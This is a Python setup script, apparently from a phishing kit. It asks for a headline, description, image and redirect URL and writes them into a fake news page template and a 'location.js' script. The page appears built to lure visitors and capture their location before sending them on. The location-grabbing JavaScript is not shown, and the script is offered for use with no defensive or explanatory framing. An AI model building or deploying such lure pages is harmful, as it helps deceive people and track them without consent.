#!/usr/bin/env python3

import os
import shutil


R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white



title = input(G + '[+]' + C + ' News Title : ' + W)
description = input(G + '[+]' + C + ' Description : ' + W)

image = input(G + '[+]' + C + ' Image cover : ' + W)
img_name = image.split('/')[-1]
redirect = input(G + '[+]' + C + ' Enter redirect URL : ' + W)

with open('template/fnews/js/location_temp.js', 'r') as js:
	reader = js.read()
	update = reader.replace('REDIRECT_URL', redirect)

with open('template/fnews/js/location.js', 'w') as js_update:
	js_update.write(update)


try:
    shutil.copyfile(image, 'template/fnews/images/{}'.format(img_name))
except Exception as e:
    print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
    exit()

with open('template/fnews/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    code = code.replace('$TITLE$', title)
    code = code.replace('$TITLE1$', title)
    code = code.replace('$DESCRIPTION$', description)
    code = code.replace('$DESCRIPTION1$', description)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/fnews/index.html', 'w') as new_index:
    new_index.write(code)